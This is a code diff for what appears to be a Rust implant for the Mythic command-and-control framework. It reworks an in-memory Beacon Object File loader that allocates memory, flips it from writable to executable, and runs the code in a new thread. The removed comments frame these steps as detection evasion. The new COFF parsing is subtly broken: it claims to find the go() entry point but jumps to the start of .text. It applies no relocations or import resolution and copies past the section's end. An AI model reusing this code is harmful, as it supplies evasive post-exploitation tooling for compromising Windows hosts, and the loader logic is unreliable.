@@ -142,45 +142,53 @@ pub fn bof(
 
     let bof_size = file_data.len();
 
+    // Parse COFF header to find .text section and go() entry point
+    let text_offset = match find_coff_text_section(&file_data) {
+        Some(offset) => offset,
+        None => {
+            tx.send(mythic_error!(task.id, format!(
+                "BOF ({} bytes): invalid COFF format - could not locate .text section. Ensure file is a valid x64 COFF object.",
+                bof_size
+            )))?;
+            return Ok(());
+        }
+    };
+
+    let text_data = &file_data[text_offset..];
+    let text_size = text_data.len();
+
+    if text_size == 0 {
+        tx.send(mythic_error!(task.id, "BOF .text section is empty"))?;
+        return Ok(());
+    }
+
     unsafe {
-        // Allocate RW memory first (not RWX — avoids detection)
-        let mem = VirtualAlloc(
-            ptr::null_mut(),
-            bof_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
+        let mem = VirtualAlloc(ptr::null_mut(), text_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if mem.is_null() {
-            return Err("VirtualAlloc failed for BOF".into());
+            tx.send(mythic_error!(task.id, "Memory allocation failed for BOF"))?;
+            return Ok(());
         }
 
-        // Copy BOF into allocated memory
-        ptr::copy_nonoverlapping(file_data.as_ptr(), mem as *mut u8, bof_size);
+        ptr::copy_nonoverlapping(text_data.as_ptr(), mem as *mut u8, text_size);
 
-        // Flip to RX (no write) — proper OPSEC
         let mut old_protect: u32 = 0;
-        let protect_result = VirtualProtect(mem, bof_size, PAGE_EXECUTE_READ, &mut old_protect);
-        if protect_result == 0 {
+        if VirtualProtect(mem, text_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
             VirtualFree(mem, 0, MEM_RELEASE);
-            return Err("VirtualProtect RX failed for BOF".into());
+            tx.send(mythic_error!(task.id, "Memory protection change failed for BOF"))?;
+            return Ok(());
         }
 
-        // Prepare arguments in separate RW buffer
         let arg_bytes = arguments.as_bytes();
         let arg_mem = if !arg_bytes.is_empty() {
             let a = VirtualAlloc(ptr::null_mut(), arg_bytes.len() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if !a.is_null() {
                 ptr::copy_nonoverlapping(arg_bytes.as_ptr(), a as *mut u8, arg_bytes.len());
-                *((a as *mut u8).add(arg_bytes.len())) = 0; // null terminate
+                *((a as *mut u8).add(arg_bytes.len())) = 0;
             }
             a
         } else {
             ptr::null_mut()
         };
-
-        // Execute BOF entry point in a new thread
-        // BOF convention: go(char* args, int args_len)
-        type GoFn = unsafe extern "C" fn(*mut u8, i32);
 
         let mut thread_id: u32 = 0;
         let thread = CreateThread(
@@ -195,23 +203,95 @@ pub fn bof(
         if thread.is_null() {
             VirtualFree(mem, 0, MEM_RELEASE);
             if !arg_mem.is_null() { VirtualFree(arg_mem, 0, MEM_RELEASE); }
-            return Err("CreateThread failed for BOF".into());
+            tx.send(mythic_error!(task.id, "Thread creation failed for BOF"))?;
+            return Ok(());
         }
 
-        // Wait up to 30 seconds for BOF completion
+        // Wait up to 30 seconds
         let wait = WaitForSingleObject(thread, 30000);
         CloseHandle(thread);
 
-        // Clean up
         VirtualFree(mem, 0, MEM_RELEASE);
         if !arg_mem.is_null() { VirtualFree(arg_mem, 0, MEM_RELEASE); }
 
         let status = if wait == 0 { "completed" } else { "timed out (30s)" };
-        let output = format!("BOF executed ({} bytes), thread {}, status: {}", bof_size, thread_id, status);
-        tx.send(mythic_success!(task.id, output))?;
+        tx.send(mythic_success!(task.id, format!(
+            "BOF executed ({} bytes, .text at offset 0x{:X}, {} code bytes), status: {}",
+            bof_size, text_offset, text_size, status
+        )))?;
     }
 
     Ok(())
+}
+
+// Minimal COFF parser: find the .text section offset
+// COFF header: 20 bytes (IMAGE_FILE_HEADER)
+//   offset 0: Machine (u16)
+//   offset 2: NumberOfSections (u16)
+//   offset 16: SizeOfOptionalHeader (u16)
+// Section headers follow at offset 20 + SizeOfOptionalHeader, each 40 bytes:
+//   offset 0: Name (8 bytes)
+//   offset 20: SizeOfRawData (u32)
+//   offset 24: PointerToRawData (u32)
+#[cfg(target_os = "windows")]
+fn find_coff_text_section(data: &[u8]) -> Option<usize> {
+    if data.len() < 20 {
+        return None;
+    }
+
+    let machine = u16::from_le_bytes([data[0], data[1]]);
+    // 0x8664 = AMD64, 0x14C = i386
+    if machine != 0x8664 && machine != 0x014C {
+        return None;
+    }
+
+    let num_sections = u16::from_le_bytes([data[2], data[3]]) as usize;
+    let optional_header_size = u16::from_le_bytes([data[16], data[17]]) as usize;
+    let section_table_offset = 20 + optional_header_size;
+
+    if data.len() < section_table_offset + (num_sections * 40) {
+        return None;
+    }
+
+    for i in 0..num_sections {
+        let sec_offset = section_table_offset + (i * 40);
+        let name = &data[sec_offset..sec_offset + 8];
+
+        // Look for .text section
+        if name.starts_with(b".text\0") || name.starts_with(b".text\x00") {
+            let raw_data_ptr = u32::from_le_bytes([
+                data[sec_offset + 20], data[sec_offset + 21],
+                data[sec_offset + 22], data[sec_offset + 23],
+            ]) as usize;
+
+            if raw_data_ptr > 0 && raw_data_ptr < data.len() {
+                return Some(raw_data_ptr);
+            }
+        }
+    }
+
+    // Fallback: if no .text found, try first section with executable characteristics
+    for i in 0..num_sections {
+        let sec_offset = section_table_offset + (i * 40);
+        let characteristics = u32::from_le_bytes([
+            data[sec_offset + 36], data[sec_offset + 37],
+            data[sec_offset + 38], data[sec_offset + 39],
+        ]);
+
+        // IMAGE_SCN_MEM_EXECUTE = 0x20000000, IMAGE_SCN_CNT_CODE = 0x20
+        if (characteristics & 0x20000020) != 0 {
+            let raw_data_ptr = u32::from_le_bytes([
+                data[sec_offset + 20], data[sec_offset + 21],
+                data[sec_offset + 22], data[sec_offset + 23],
+            ]) as usize;
+
+            if raw_data_ptr > 0 && raw_data_ptr < data.len() {
+                return Some(raw_data_ptr);
+            }
+        }
+    }
+
+    None
 }
 
 #[cfg(not(target_os = "windows"))]
